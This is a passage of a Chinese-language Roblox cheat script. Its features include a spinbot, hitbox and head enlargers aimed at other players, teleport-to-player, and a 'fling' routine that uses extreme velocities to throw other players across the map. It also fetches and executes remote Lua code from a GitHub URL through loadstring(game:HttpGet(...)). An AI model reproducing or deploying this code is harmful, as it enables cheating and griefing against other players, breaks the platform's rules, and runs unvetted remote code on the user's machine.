        angVelocity.Attachment0 = humRoot:WaitForChild("RootAttachment")
        angVelocity.MaxTorque = math.huge
        angVelocity.AngularVelocity = velocity
        angVelocity.Parent = humRoot
        angVelocity.Name = "Spinbot"
        
        if bin.connection then
            bin.connection:Disconnect()
        end
        
        bin.connection = plr.CharacterAdded:Connect(function(newChar)
            task.wait(1) 
            if bin.spinbotActive then
                local newHumanoid = newChar:WaitForChild("Humanoid")
                local newRoot = newChar:WaitForChild("HumanoidRootPart")
                
                newHumanoid.AutoRotate = false
                
               
                local newVelocity = Vector3.new(0, 0, 0)
                if bin.axis == "X" then
                    newVelocity = Vector3.new(bin.speed * bin.direction, 0, 0)
                elseif bin.axis == "Y" then
                    newVelocity = Vector3.new(0, bin.speed * bin.direction, 0)
                elseif bin.axis == "Z" then
                    newVelocity = Vector3.new(0, 0, bin.speed * bin.direction)
                end
                
                local angVelocity = Instance.new("AngularVelocity")
                angVelocity.Attachment0 = newRoot:WaitForChild("RootAttachment")
                angVelocity.MaxTorque = math.huge
                angVelocity.AngularVelocity = newVelocity
                angVelocity.Parent = newRoot
                angVelocity.Name = "Spinbot"
            end
        end)
    else
        local spinbot = humRoot:FindFirstChild("Spinbot")
        if spinbot then
            spinbot:Destroy()
        end
        
        humanoid.AutoRotate = true
        
        if bin.connection then
            bin.connection:Disconnect()
            bin.connection = nil
        end
    end
end)

local about = PIJIAOBEN:section("范围", false)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

getgenv().HitboxConfig = {
    Size = 10,
    Transparency = 0.7,
    Active = false,
    TeamCheck = false,
    Color = "红色",
    Material = "霓虹",
    RainbowColor = false,
    CheckCorpses = false,
    ShowOutline = false,
    EnableCollision = false,
    GlowEffect = false,
    PulseEffect = false,
    AffectNPC = false, 
    DefaultSize = Vector3.new(2, 2, 1),
    DefaultTransparency = 1,
    DefaultMaterial = "塑料",
    UpdateInterval = 0.1
}

local ColorMap = {
    ["红色"] = Color3.fromRGB(255, 0, 0),
    ["蓝色"] = Color3.fromRGB(0, 0, 255),
    ["黄色"] = Color3.fromRGB(255, 255, 0),
    ["绿色"] = Color3.fromRGB(0, 255, 0),
    ["青色"] = Color3.fromRGB(0, 255, 255),
    ["橙色"] = Color3.fromRGB(255, 165, 0),
    ["紫色"] = Color3.fromRGB(128, 0, 128),
    ["白色"] = Color3.fromRGB(255, 255, 255),
    ["黑色"] = Color3.fromRGB(0, 0, 0),
    ["彩虹色"] = Color3.fromRGB(255, 0, 0)
}

local MaterialMap = {
    ["霓虹"] = "Neon",
    ["塑料"] = "Plastic",
    ["木头"] = "Wood",
    ["石板"] = "Slate",
    ["混凝土"] = "Concrete",
    ["腐蚀金属"] = "CorrodedMetal",
    ["钻石板"] = "DiamondPlate",
    ["箔片"] = "Foil",
    ["草地"] = "Grass",
    ["冰"] = "Ice",
    ["大理石"] = "Marble",
    ["花岗岩"] = "Granite",
    ["砖块"] = "Brick",
    ["鹅卵石"] = "Pebble",
    ["沙子"] = "Sand",
    ["布料"] = "Fabric",
    ["光滑塑料"] = "SmoothPlastic",
    ["金属"] = "Metal",
    ["木板"] = "WoodPlanks",
    ["圆石"] = "Cobblestone"
}

local playerCharacters = {}
local npcCharacters = {}
local heartbeatConnection = nil

local function getRainbowColor()
    local hue = (tick() % 5) / 5
    return Color3.fromHSV(hue, 1, 1)
end

local function getPulseSize(baseSize)
    if not getgenv().HitboxConfig.PulseEffect then
        return baseSize
    end
    local pulse = math.sin(tick() * 2) * 0.2 + 1
    return baseSize * pulse
end

local function isCorpse(character)
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        if humanoid.Health <= 0 then
            return true
        end
    end
    return false
end

local function isNPC(character)
    if Players:GetPlayerFromCharacter(character) then
        return false
    end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        return true
    end
    return false
end

local function onCharacterAdded(player, character)
    playerCharacters[player] = character
    applyHitboxToCharacter(player, character)
end

local function applyHitboxToCharacter(player, character)
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    if not getgenv().HitboxConfig.Active then
        rootPart.Size = HitboxConfig.DefaultSize
        rootPart.Transparency = HitboxConfig.DefaultTransparency
        rootPart.Material = Enum.Material[MaterialMap[HitboxConfig.DefaultMaterial] or "Plastic"]
        rootPart.CanCollide = true
        
        local highlight = rootPart:FindFirstChildOfClass("Highlight")
        if highlight then
            highlight:Destroy()
        end
        
        local pointLight = rootPart:FindFirstChildOfClass("PointLight")
        if pointLight then
            pointLight:Destroy()
        end
    end
end

local function scanForNPCs()
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Model") and obj:FindFirstChildOfClass("Humanoid") then
            local character = obj
            if not Players:GetPlayerFromCharacter(character) then
                if not npcCharacters[character] then
                    npcCharacters[character] = character
                end
            end
        end
    end
    
    for char, _ in pairs(npcCharacters) do
        if not char or not char.Parent then
            npcCharacters[char] = nil
        end
    end
end

local function onPlayerAdded(player)
    player.CharacterAdded:Connect(function(character)
        onCharacterAdded(player, character)
    end)
    if player.Character then
        task.spawn(onCharacterAdded, player, player.Character)
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    task.spawn(onPlayerAdded, player)
end
Players.PlayerAdded:Connect(onPlayerAdded)

task.spawn(function()
    while true do
        if getgenv().HitboxConfig.AffectNPC then
            scanForNPCs()
        end
        task.wait(2)
    end
end)

local function UpdateHitboxes()
    for player, character in pairs(playerCharacters) do
        if player == Players.LocalPlayer then continue end
        
        if getgenv().HitboxConfig.TeamCheck and player.Team == Players.LocalPlayer.Team then
            continue
        end

        if getgenv().HitboxConfig.CheckCorpses and isCorpse(character) then
            continue
        end

        pcall(function()
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if not rootPart then return end

            if getgenv().HitboxConfig.Active then
                local currentSize = getPulseSize(HitboxConfig.Size)
                rootPart.Size = Vector3.new(currentSize, currentSize, currentSize)
                rootPart.Transparency = HitboxConfig.Transparency
                
                if getgenv().HitboxConfig.RainbowColor then
                    rootPart.Color = getRainbowColor()
                else
                    rootPart.Color = ColorMap[HitboxConfig.Color] or Color3.fromRGB(255, 0, 0)
                end
                
                rootPart.Material = Enum.Material[MaterialMap[HitboxConfig.Material] or "Neon"]
                rootPart.CanCollide = getgenv().HitboxConfig.EnableCollision
                
                if getgenv().HitboxConfig.ShowOutline then
                    local highlight = rootPart:FindFirstChildOfClass("Highlight") or Instance.new("Highlight")
                    highlight.FillTransparency = 1
                    highlight.OutlineColor = rootPart.Color
                    highlight.OutlineTransparency = HitboxConfig.Transparency
                    highlight.Parent = rootPart
                else
                    local highlight = rootPart:FindFirstChildOfClass("Highlight")
                    if highlight then
                        highlight:Destroy()
                    end
                end
                
                if getgenv().HitboxConfig.GlowEffect then
                    local pointLight = rootPart:FindFirstChildOfClass("PointLight") or Instance.new("PointLight")
                    pointLight.Brightness = 5
                    pointLight.Range = 15
                    pointLight.Color = rootPart.Color
                    pointLight.Parent = rootPart
                else
                    local pointLight = rootPart:FindFirstChildOfClass("PointLight")
                    if pointLight then
                        pointLight:Destroy()
                    end
                end
            else
                rootPart.Size = HitboxConfig.DefaultSize
                rootPart.Transparency = HitboxConfig.DefaultTransparency
                rootPart.Material = Enum.Material[MaterialMap[HitboxConfig.DefaultMaterial] or "Plastic"]
                rootPart.CanCollide = true
                
                local highlight = rootPart:FindFirstChildOfClass("Highlight")
                if highlight then
                    highlight:Destroy()
                end
                
                local pointLight = rootPart:FindFirstChildOfClass("PointLight")
                if pointLight then
                    pointLight:Destroy()
                end
            end
        end)
    end
    
    if getgenv().HitboxConfig.AffectNPC and getgenv().HitboxConfig.Active then
        for character, _ in pairs(npcCharacters) do
            if character and character.Parent then
                if getgenv().HitboxConfig.CheckCorpses and isCorpse(character) then
                    continue
                end
                
                pcall(function()
                    local rootPart = character:FindFirstChild("HumanoidRootPart")
                    if not rootPart then return end
                    
                    local currentSize = getPulseSize(HitboxConfig.Size)
                    rootPart.Size = Vector3.new(currentSize, currentSize, currentSize)
                    rootPart.Transparency = HitboxConfig.Transparency
                    
                    if getgenv().HitboxConfig.RainbowColor then
                        rootPart.Color = getRainbowColor()
                    else
                        rootPart.Color = ColorMap[HitboxConfig.Color] or Color3.fromRGB(255, 0, 0)
                    end
                    
                    rootPart.Material = Enum.Material[MaterialMap[HitboxConfig.Material] or "Neon"]
                    rootPart.CanCollide = getgenv().HitboxConfig.EnableCollision
                    
                    if getgenv().HitboxConfig.ShowOutline then
                        local highlight = rootPart:FindFirstChildOfClass("Highlight") or Instance.new("Highlight")
                        highlight.FillTransparency = 1
                        highlight.OutlineColor = rootPart.Color
                        highlight.OutlineTransparency = HitboxConfig.Transparency
                        highlight.Parent = rootPart
                    else
                        local highlight = rootPart:FindFirstChildOfClass("Highlight")
                        if highlight then
                            highlight:Destroy()
                        end
                    end
                    
                    if getgenv().HitboxConfig.GlowEffect then
                        local pointLight = rootPart:FindFirstChildOfClass("PointLight") or Instance.new("PointLight")
                        pointLight.Brightness = 5
                        pointLight.Range = 15
                        pointLight.Color = rootPart.Color
                        pointLight.Parent = rootPart
                    else
                        local pointLight = rootPart:FindFirstChildOfClass("PointLight")
                        if pointLight then
                            pointLight:Destroy()
                        end
                    end
                end)
            end
        end
    end
end

local function resetNPCs()
    for character, _ in pairs(npcCharacters) do
        if character and character.Parent then
            pcall(function()
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    rootPart.Size = HitboxConfig.DefaultSize
                    rootPart.Transparency = HitboxConfig.DefaultTransparency
                    rootPart.Material = Enum.Material[MaterialMap[HitboxConfig.DefaultMaterial] or "Plastic"]
                    rootPart.CanCollide = true
                    
                    local highlight = rootPart:FindFirstChildOfClass("Highlight")
                    if highlight then highlight:Destroy() end
                    
                    local pointLight = rootPart:FindFirstChildOfClass("PointLight")
                    if pointLight then pointLight:Destroy() end
                end
            end)
        end
    end
end

about:Toggle("开启/关闭范围", "HitboxStatus", false, function(state)
    getgenv().HitboxConfig.Active = state

    if heartbeatConnection then
        heartbeatConnection:Disconnect()
        heartbeatConnection = nil
    end

    if state then
        heartbeatConnection = RunService.Heartbeat:Connect(function()
            UpdateHitboxes()
            task.wait(HitboxConfig.UpdateInterval)
        end)
        UpdateHitboxes()
    else
        UpdateHitboxes()
        if getgenv().HitboxConfig.AffectNPC then
            resetNPCs()
        end
    end
end)

about:Textbox("范围大小设置", "HitboxSize", "输入", function(value)
    local num = tonumber(value)
    if num and num > 0 then
        getgenv().HitboxConfig.Size = num
        if getgenv().HitboxConfig.Active then
            UpdateHitboxes()
        end
    end
end)

about:Textbox("范围透明度设置(0-1)", "HitboxTransparency", "输入", function(value)
    local num = tonumber(value)
    if num and num >= 0 and num <= 1 then
        getgenv().HitboxConfig.Transparency = num
        if getgenv().HitboxConfig.Active then
            UpdateHitboxes()
        end
    end
end)

about:Dropdown("选择范围颜色", "HitboxColor", {"红色","蓝色","黄色","绿色","青色","橙色","紫色","白色","黑色","彩虹色"}, function(value)
    if ColorMap[value] then
        getgenv().HitboxConfig.Color = value
        getgenv().HitboxConfig.RainbowColor = (value == "彩虹色")
        if getgenv().HitboxConfig.Active then
            UpdateHitboxes()
        end
    end
end)

about:Dropdown("选择范围材质", "HitboxMaterial", {
    "霓虹", "塑料", "木头", "石板", "混凝土", "腐蚀金属", 
    "钻石板", "箔片", "草地", "冰", "大理石", "花岗岩", 
    "砖块", "鹅卵石", "沙子", "布料", "光滑塑料", "金属", 
    "木板", "圆石"
}, function(value)
    if MaterialMap[value] then
        getgenv().HitboxConfig.Material = value
        if getgenv().HitboxConfig.Active then
            UpdateHitboxes()
        end
    end
end)

about:Toggle("NPC范围", "AffectNPC", false, function(state)
    getgenv().HitboxConfig.AffectNPC = state
    if state then
        scanForNPCs()
        if getgenv().HitboxConfig.Active then
            UpdateHitboxes()
        end
    else
        resetNPCs()
    end
end)

about:Toggle("队伍检测", "TeamCheck", false, function(state)
    getgenv().HitboxConfig.TeamCheck = state
    if getgenv().HitboxConfig.Active then
        UpdateHitboxes()
    end
end)

about:Toggle("活体检测", "CorpseCheck", false, function(state)
    getgenv().HitboxConfig.CheckCorpses = state
    if getgenv().HitboxConfig.Active then
        UpdateHitboxes()
    end
end)

about:Toggle("显示轮廓", "ShowOutline", false, function(state)
    getgenv().HitboxConfig.ShowOutline = state
    if getgenv().HitboxConfig.Active then
        UpdateHitboxes()
    end
end)

about:Toggle("启用/禁用碰撞", "EnableCollision", false, function(state)
    getgenv().HitboxConfig.EnableCollision = state
    if getgenv().HitboxConfig.Active then
        UpdateHitboxes()
    end
end)

about:Toggle("发光效果", "GlowEffect", false, function(state)
    getgenv().HitboxConfig.GlowEffect = state
    if getgenv().HitboxConfig.Active then
        UpdateHitboxes()
    end
end)

about:Toggle("脉动效果", "PulseEffect", false, function(state)
    getgenv().HitboxConfig.PulseEffect = state
    if getgenv().HitboxConfig.Active then
        UpdateHitboxes()
    end
end)

local about = PIJIAOBEN:section("头部范围", false)

local headSizeModule = {
    Enabled = false,
    CurrentSize = 1,
    PlayerConnections = {},
    PlayerAddedConnection = nil,
    RainbowConnection = nil,
    CollisionEnabled = false,
    HeadColor = Color3.fromRGB(255, 255, 255),
    Transparency = 1, 
    
    IsAlive = function(self, player)
        return player and 
               player.Character and 
               player.Character:FindFirstChild("Head") and 
               player.Character:FindFirstChild("Humanoid") and 
               player.Character.Humanoid.Health > 0
    end,
    
   
    GetRainbowColor = function(self)
        local hue = tick() % 1
        return Color3.fromHSV(hue, 1, 1)
    end,
    
    SetHeadSize = function(self, player, size)
        if not player or not size then return end
        pcall(function()
            if self:IsAlive(player) then
                local head = player.Character.Head
                head.Massless = true
                head.Size = Vector3.new(size, size, size)
                head.CanCollide = self.CollisionEnabled
                head.Transparency = 1 - self.Transparency 
                head.BrickColor = BrickColor.new(self.HeadColor)
                head.Material = Enum.Material.Neon
            end
        end)
    end,
    
    ResetHeadSize = function(self, player)
        pcall(function()
            if self:IsAlive(player) then
                local head = player.Character.Head
                head.Massless = false
                head.Size = Vector3.new(1, 1, 1)
                head.CanCollide = true
                head.Transparency = 0
                head.BrickColor = BrickColor.new("Medium stone grey")
                head.Material = Enum.Material.Plastic
            end
        end)
    end,
    
    StartRainbowLoop = function(self)
        if self.RainbowConnection then
            self.RainbowConnection:Disconnect()
        end
        
        self.RainbowConnection = game:GetService("RunService").Heartbeat:Connect(function()
            if not self.Enabled then return end
            
          
            if self.HeadColor == "rainbow" then
                for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game:GetService("Players").LocalPlayer and self:IsAlive(player) then
                        local head = player.Character.Head
                        head.BrickColor = BrickColor.new(self:GetRainbowColor())
                    end
                end
            end
        end)
    end,
    
    SetupPlayerListener = function(self, player)
        if self.PlayerConnections[player] then
            self.PlayerConnections[player]:Disconnect()
        end
        
        self.PlayerConnections[player] = player.CharacterAdded:Connect(function()
            if self.Enabled then
                task.wait(0.5)
                self:SetHeadSize(player, self.CurrentSize)
            end
        end)
        
        if self.Enabled then
            self:SetHeadSize(player, self.CurrentSize)
        end
    end,
    
    Initialize = function(self)
        for player, conn in pairs(self.PlayerConnections or {}) do
            if conn then conn:Disconnect() end
        end
        self.PlayerConnections = {}
        
        for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
            if player ~= game:GetService("Players").LocalPlayer then
                self:SetupPlayerListener(player)
            end
        end
        
        if self.PlayerAddedConnection then
            self.PlayerAddedConnection:Disconnect()
        end
        self.PlayerAddedConnection = game:GetService("Players").PlayerAdded:Connect(function(player)
            if player ~= game:GetService("Players").LocalPlayer then
                self:SetupPlayerListener(player)
            end
        end)
        
        self:StartRainbowLoop()
    end,
    
    Cleanup = function(self)
        for _, conn in pairs(self.PlayerConnections or {}) do
            if conn then conn:Disconnect() end
        end
        self.PlayerConnections = {}
        
        if self.PlayerAddedConnection then
            self.PlayerAddedConnection:Disconnect()
            self.PlayerAddedConnection = nil
        end
        
        if self.RainbowConnection then
            self.RainbowConnection:Disconnect()
            self.RainbowConnection = nil
        end
        
        for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
            if player ~= game:GetService("Players").LocalPlayer then
                self:ResetHeadSize(player)
            end
        end
    end,
    
    UpdateAllColors = function(self)
        if self.Enabled and self.HeadColor ~= "rainbow" then
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player ~= game:GetService("Players").LocalPlayer and self:IsAlive(player) then
                    local head = player.Character.Head
                    head.BrickColor = BrickColor.new(self.HeadColor)
                end
            end
        end
    end,
    
    UpdateAllTransparency = function(self)
        if self.Enabled then
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player ~= game:GetService("Players").LocalPlayer and self:IsAlive(player) then
                    local head = player.Character.Head
                    head.Transparency = 1 - self.Transparency
                end
            end
        end
    end,
    
    UpdateAllCollision = function(self)
        if self.Enabled then
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player ~= game:GetService("Players").LocalPlayer and self:IsAlive(player) then
                    player.Character.Head.CanCollide = self.CollisionEnabled
                end
            end
        end
    end
}

local colorNames = {"红", "绿", "蓝", "黄", "紫", "白", "黑", "橙", "青", "粉", "彩虹"}
local colorValues = {
    Color3.fromRGB(255, 0, 0),
    Color3.fromRGB(0, 255, 0),
    Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(255, 255, 0),
    Color3.fromRGB(128, 0, 128),
    Color3.fromRGB(255, 255, 255),
    Color3.fromRGB(0, 0, 0),
    Color3.fromRGB(255, 165, 0),
    Color3.fromRGB(0, 255, 255),
    Color3.fromRGB(255, 105, 180),
    "rainbow"
}

headSizeModule:Initialize()

about:Textbox("设置玩家头部大小", "", "输入", function(Value)
    local size = tonumber(Value)
    if size and size > 0 then
        headSizeModule.CurrentSize = size
        if headSizeModule.Enabled then
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player ~= game:GetService("Players").LocalPlayer then
                    headSizeModule:SetHeadSize(player, headSizeModule.CurrentSize)
                end
            end
        end
    end
end)

about:Toggle("开启/关闭修改头部大小", "", false, function(state)
    headSizeModule.Enabled = state
    if state then
        headSizeModule:Initialize()
    else
        headSizeModule:Cleanup()
    end
end)

about:Toggle("启用头部碰撞", "", false, function(state)
    headSizeModule.CollisionEnabled = state
    headSizeModule:UpdateAllCollision()
end)

about:Dropdown("头部颜色", "", colorNames, function(selected)
    for i, name in ipairs(colorNames) do
        if name == selected then
            headSizeModule.HeadColor = colorValues[i]
            headSizeModule:UpdateAllColors()
            break
        end
    end
end)

about:Slider("头部透明度", "", 1, 0, 1, true, function(value)
    headSizeModule.Transparency = value
    headSizeModule:UpdateAllTransparency()
end)

local PIJIAOBEN = XIAOPI:Tab("传送与甩飞","136169594232359")

local Select = PIJIAOBEN:section("选择玩家", false)

local run = function(func) func() end

run(function()
    _G.LSConfig = {
        playernamedied = "",
        dropdown = {},
        LoopTeleport = false,
        aimbotLoop = nil,
        Direction = "前面",
        Distance = 3,
        OrbitLoop = nil,
        OrbitRadius = 5,
        OrbitSpeed = 1,
        AutoRefresh = false,
        RefreshInterval = 5,
        NameType = "用户名",
        VIPUsers = {},
        ProtectedUsers = {"78lwq29"}  
    }
end)

run(function()
    _G.LSServices = {
        Players = game:GetService("Players"),
        RunService = game:GetService("RunService"),
        Workspace = game:GetService("Workspace"),
        LocalPlayer = game:GetService("Players").LocalPlayer
    }
end)

run(function()
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/refs/heads/main/Roblox-Pi-Script-VIPUsers.lua"))()
    end)
    
    if success and result then
        _G.LSConfig.VIPUsers = result
    else
        _G.LSConfig.VIPUsers = {}
    end
end)

run(function()
    _G.LSUtils = {
        shuaxinlb = function(zji)
            local LS = _G.LSConfig
            local Players = _G.LSServices.Players
            LS.dropdown = {"所有人"}
            
            if zji == true then
                for _, player in pairs(Players:GetPlayers()) do
                   
                    if not table.find(LS.ProtectedUsers, player.Name) then
                        if LS.NameType == "昵称" then
                            table.insert(LS.dropdown, player.DisplayName)
                        else
                            table.insert(LS.dropdown, player.Name)
                        end
                    end
                end
            else
                local lp = Players.LocalPlayer
                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= lp then
                      
                        if not table.find(LS.ProtectedUsers, player.Name) then
                            if LS.NameType == "昵称" then
                                table.insert(LS.dropdown, player.DisplayName)
                            else
                                table.insert(LS.dropdown, player.Name)
                            end
                        end
                    end
                end
            end
        end,
        
        getPlayerByName = function(name)
            local LS = _G.LSConfig
            local Players = _G.LSServices.Players
            
            if name == "所有人" then
                return nil
            end
            
            local targetPlayer = nil
            
            if LS.NameType == "昵称" then
                for _, player in pairs(Players:GetPlayers()) do
                    if player.DisplayName == name then
                        targetPlayer = player
                        break
                    end
                end
            else
                targetPlayer = Players:FindFirstChild(name)
            end
            
           
            if not targetPlayer then
                for _, player in pairs(Players:GetPlayers()) do
                    if player.Name == name or player.DisplayName == name then
                        targetPlayer = player
                        break
                    end
                end
            end
            
         
            if targetPlayer and table.find(LS.ProtectedUsers, targetPlayer.Name) then
                return nil
            end
            
            return targetPlayer
        end,
        
        isProtected = function(player)
            if not player then return false end
            local LS = _G.LSConfig
            if LS.ProtectedUsers and table.find(LS.ProtectedUsers, player.Name) then
                return true
            end
            return false
        end,
        
        isVIP = function(player)
            if not player then return false end
            local VIPUsers = _G.LSConfig.VIPUsers
            if VIPUsers and VIPUsers[player.Name] then
                return true
            end
            return false
        end,
        
        getTeleportPosition = function(targetHRP, direction, distance)
            local lookVector = targetHRP.CFrame.lookVector
            local rightVector = targetHRP.CFrame.rightVector
            local upVector = targetHRP.CFrame.upVector
            
            if direction == "前面" then
                return targetHRP.CFrame + lookVector * distance
            elseif direction == "后面" then
                return targetHRP.CFrame - lookVector * distance
            elseif direction == "左面" then
                return targetHRP.CFrame - rightVector * distance
            elseif direction == "右面" then
                return targetHRP.CFrame + rightVector * distance
            elseif direction == "上面" then
                return targetHRP.CFrame + upVector * distance
            elseif direction == "下面" then
                return targetHRP.CFrame - upVector * distance
            end
        end,
        
        startAutoRefresh = function(dropdownElement)
            _G.LSConfig.AutoRefresh = true
            spawn(function()
                while _G.LSConfig.AutoRefresh do
                    wait(_G.LSConfig.RefreshInterval)
                    pcall(function()
                        if _G.LSConfig.AutoRefresh then
                            _G.LSUtils.shuaxinlb(true)
                            if dropdownElement then
                                dropdownElement:SetOptions(_G.LSConfig.dropdown)
                            end
                        end
                    end)
                end
            end)
        end,
        
        stopAutoRefresh = function()
            _G.LSConfig.AutoRefresh = false
        end
    }
end)

run(function()
    _G.LSFling = {
        GetPlayer = function(Name, Player, AllBool)
            local Players = _G.LSServices.Players
            Name = Name:lower()
            if Name == "all" or Name == "others" or Name == "所有人" then
                AllBool = true
                return nil, AllBool
            elseif Name == "random" then
                local GetPlayers = Players:GetPlayers()
                if table.find(GetPlayers, Player) then
                    table.remove(GetPlayers, table.find(GetPlayers, Player))
                end
          
                local ProtectedUsers = _G.LSConfig.ProtectedUsers or {}
                for i = #GetPlayers, 1, -1 do
                    if table.find(ProtectedUsers, GetPlayers[i].Name) then
                        table.remove(GetPlayers, i)
                    end
                end
                if #GetPlayers == 0 then return nil, AllBool end
                return GetPlayers[math.random(#GetPlayers)], AllBool
            elseif Name ~= "random" and Name ~= "all" and Name ~= "others" and Name ~= "所有人" then
                for _, x in next, Players:GetPlayers() do
                    if x ~= Player then
                        if not _G.LSUtils.isProtected(x) then
                            if x.Name:lower():match("^" .. Name) then
                                return x, AllBool
                            elseif x.DisplayName:lower():match("^" .. Name) then
                                return x, AllBool
                            end
                        end
                    end
                end
            end
            return nil, AllBool
        end,
        
        SkidFling = function(TargetPlayer, Player, AllBool, Message)
            local Workspace = _G.LSServices.Workspace
            local LS = _G.LSConfig
            
          
            if _G.LSUtils.isProtected(TargetPlayer) then
                if Message then
                    Message("皮脚本", "该玩家受到保护，无法甩飞", 3)
                end
                return
            end
            
            if _G.LSUtils.isVIP(TargetPlayer) then
                if Message then
                    Message("皮脚本", "该玩家是VIP用户，无法甩飞", 3)
                end
                return
            end
            
            local Character = Player.Character
            local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
            local RootPart = Humanoid and Humanoid.RootPart
            
            local TCharacter = TargetPlayer.Character
            local THumanoid
            local TRootPart
            local THead
            local Accessory
            local Handle
            
            if TCharacter:FindFirstChildOfClass("Humanoid") then
                THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
            end
            if THumanoid and THumanoid.RootPart then
                TRootPart = THumanoid.RootPart
            end
            if TCharacter:FindFirstChild("Head") then
                THead = TCharacter.Head
            end
            if TCharacter:FindFirstChildOfClass("Accessory") then
                Accessory = TCharacter:FindFirstChildOfClass("Accessory")
            end
            if Accessory and Accessory:FindFirstChild("Handle") then
                Handle = Accessory.Handle
            end
            
            if Character and Humanoid and RootPart then
                if RootPart.Velocity.Magnitude < 50 then
                    getgenv().OldPos = RootPart.CFrame
                end
                if THumanoid and THumanoid.Sit and not AllBool then
                    return Message("玩家消失", "已停止", 5)
                end
                if THead then
                    Workspace.CurrentCamera.CameraSubject = THead
                elseif not THead and Handle then
                    Workspace.CurrentCamera.CameraSubject = Handle
                elseif THumanoid and TRootPart then
                    Workspace.CurrentCamera.CameraSubject = THumanoid
                end
                if not TCharacter:FindFirstChildWhichIsA("BasePart") then
                    return
                end
                
                local FPos = function(BasePart, Pos, Ang)
                    RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
                    Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
                    RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
                    RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
                end
                
                local SFBasePart = function(BasePart)
                    local TimeToWait = 2
                    local Time = tick()
                    local Angle = 0
                    
                    repeat
                        if RootPart and THumanoid then
                            if BasePart.Velocity.Magnitude < 50 then
                                Angle = Angle + 100
                                
                                FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
                                task.wait()
                            else
                                FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
                                task.wait()
                                
                                FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                                task.wait()
                            end
                        else
                            break
                        end
                    until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= _G.LSServices.Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
                end
                
                Workspace.FallenPartsDestroyHeight = 0 / 0
                
                local BV = Instance.new("BodyVelocity")
                BV.Name = "EpixVel"
                BV.Parent = RootPart
                BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
                BV.MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0)
                
                Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                
                if TRootPart and THead then
                    if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                        SFBasePart(THead)
                    else
                        SFBasePart(TRootPart)
                    end
                elseif TRootPart and not THead then
                    SFBasePart(TRootPart)
                elseif not TRootPart and THead then
                    SFBasePart(THead)
                elseif not TRootPart and not THead and Accessory and Handle then
                    SFBasePart(Handle)
                else
                    return Message("皮脚本", "已开/关", 5)
                end
                
                BV:Destroy()
                Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                Workspace.CurrentCamera.CameraSubject = Humanoid
                
                repeat
